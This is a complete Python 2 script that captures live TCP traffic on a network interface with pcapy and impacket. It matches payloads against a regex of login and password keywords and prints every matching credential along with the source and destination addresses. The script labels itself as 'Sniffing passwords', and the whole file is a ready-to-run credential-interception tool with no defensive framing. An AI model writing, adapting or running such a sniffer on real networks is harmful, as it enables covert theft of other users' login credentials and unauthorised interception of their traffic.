#!/usr/bin/python
import sys
import re
import getopt
import pcapy
from impacket.ImpactDecoder import EthDecoder, IPDecoder, TCPDecoder

dev ="wlp3s0"

filter = "tcp"

eth_dec = EthDecoder()
ip_dec = IPDecoder()
tcp_dec = TCPDecoder()

pattern = re.compile(r"""(?P<found>(USER|USERNAME|PASS|PASSWORD|LOGIN|BENUTZER|PASSWORD|AUTH|ACCESS)[=:\s].+)\b""", re.MULTILINE|re.IGNORECASE)

def handle_packet(hdr, data):
    eth_pkt = eth_dec.decode(data)
    ip_pkt = ip_dec.decode(eth_pkt.get_data_as_string())
    tcp_pkt = tcp_dec.decode(ip_pkt.get_data_as_string())
    payload = ip_pkt.get_data_as_string()
    match = re.search(pattern, payload)

    if not tcp_pkt.get_SYN() and not tcp_pkt.get_RST() and not tcp_pkt.get_FIN() and match and match.groupdict()['found'] != None:
        print "%s:%d -> %s:%d" % (ip_pkt.get_ip_src(), tcp_pkt.get_th_sport(), ip_pkt.get_ip_dst(), tcp_pkt.get_th_dport())
        print "\t%s\n" % (match.groupdict()['found'])
        print "Data %s" %(payload)

def usage ():
    print sys.argv[0] + "-i <dev> -f <pcap_filter>"
    sys.exit(1)

try:
    cmd_opts = "f:i:"
    opts,args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-f":
        filter = opt[1]
    elif opt[0] == "-i":
        dev = opt[1]
    else:
        usage()


pcap = pcapy.open_live(dev, 1500, 0, 100)
print "Filtro : %s" % (filter)
print "Filtro : %s" % (filter)
pcap.setfilter(filter)
print "Sniffing passwords on "+str(dev)
pcap.loop(0, handle_packet)
